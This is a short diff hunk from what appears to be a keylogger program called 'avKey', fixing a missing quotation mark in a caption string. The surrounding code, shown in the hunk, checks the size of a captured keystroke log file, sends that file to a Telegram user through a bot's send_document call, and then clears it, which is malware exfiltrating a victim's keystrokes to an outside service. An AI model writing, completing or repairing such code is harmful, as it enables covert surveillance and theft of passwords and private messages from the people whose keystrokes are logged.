@@ -139,7 +139,7 @@ def log_keystroke(key):
 	for siz in size:
 		b = os.path.getsize(path)
 		if b == siz:
-			bot.send_document(usr, text_file, caption=wdusr + ' keylogs✅' + '\n\n_© avKey Coded by @termqew(Daniil) \n@termuxqew - subscribe)
+			bot.send_document(usr, text_file, caption=wdusr + ' keylogs✅' + '\n\n_© avKey Coded by @termqew(Daniil) \n@termuxqew - subscribe')
 			text_file.truncate(0)
 
 #Start listen
